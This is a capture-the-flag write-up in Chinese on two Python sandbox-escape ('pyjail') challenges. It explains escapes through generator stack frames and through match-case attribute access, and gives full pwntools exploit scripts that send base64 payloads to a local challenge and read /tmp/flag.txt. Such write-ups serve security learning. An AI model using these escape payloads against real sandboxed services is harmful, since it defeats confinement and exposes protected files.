# Pyjail 4

提示提到了栈帧（Stack Frame）。往这个方向搜索，找到了这篇文章： https://pid-blog.com/article/frame-escape-pyjail

正如提示所说，python里的函数和生成器（generator）都有一个栈帧对象维护当前调用的上下文。栈帧对象中比较重要的几个属性为：
- f_back：指向上层栈帧
- f_builtins/f_globals/f_locals：当前栈帧的`builtins`、`globals`、`locals`对象

下面是一个poc，从当前生成器的栈帧回溯到上层栈帧，并获取其globals对象：
```py
q = (q.gi_frame.f_back.f_globals for _ in [1])
g = [*q][0]
```
但是不知道为什么，我无法直接运行这个poc，显示q未定义。解决办法是像文章中`ACT Team的exp`一样套一层函数
```py
from pwn import *
code="""
def get_flag():
    def f():
        yield g.gi_frame.f_back.f_back.f_back
    g = f()
    frame=[*g][0]
    print(frame.f_builtins['open']('/tmp/flag.txt').read())
get_flag()
"""
p=remote('localhost',36271)
p.recvuntil("Please enter the reverse of '")
p.sendlineafter(": ",p.recv(8)[::-1])
p.sendlineafter(": ",base64.b64encode(code.encode()))
print(p.recvline())
```

# Pyjail 5

找到了这篇文章： https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8

在`绕过 ast.Attribute 获取属性`这节介绍了利用python 3.10新语法match-case获取属性的方法：
```py
match str():
    case str(__class__=x):
        print(x==''.__class__)
```
意思是匹配str类并将`str.__class__`的值赋值给x。上述语句在ast里触发的是`match_case`而不是`ast.Attribute`。借此我们可以拿object类的`__getattribute__`函数，然后用`_frozen_importlib_external.FileLoader`读取flag
```py
from pwn import *
code="""
match object:
    case object(__getattribute__=getattribute):
        pass
subclasses=getattribute(object,"__subclasses__")
loader=subclasses()[134]
raise Exception(getattribute(loader,"get_data")("/tmp/flag.txt","/tmp/flag.txt"))
"""
p=remote('localhost',32797)
p.recvuntil("Please enter the reverse of '")
p.sendlineafter(": ",p.recv(8)[::-1])
p.sendlineafter(": ",base64.b64encode(code.encode()))
print(p.recvline()) 
```